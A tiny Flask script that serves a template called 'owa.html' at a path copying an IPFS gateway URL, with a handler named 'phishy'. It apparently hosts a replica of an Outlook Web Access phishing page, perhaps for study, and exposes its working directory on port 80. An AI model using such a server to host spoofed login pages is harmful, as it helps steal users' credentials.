from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='ipfs.io/ipfs/bafybeigo6546tc2lvy5bi2saelvkijqf5ej66feaso4c6dhvdtfzbqnsfe')

@app.route('/ipfs/bafybeigo6546tc2lvy5bi2saelvkijqf5ej66feaso4c6dhvdtfzbqnsfe/owa.html')
def phishy():
    return render_template('owa.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)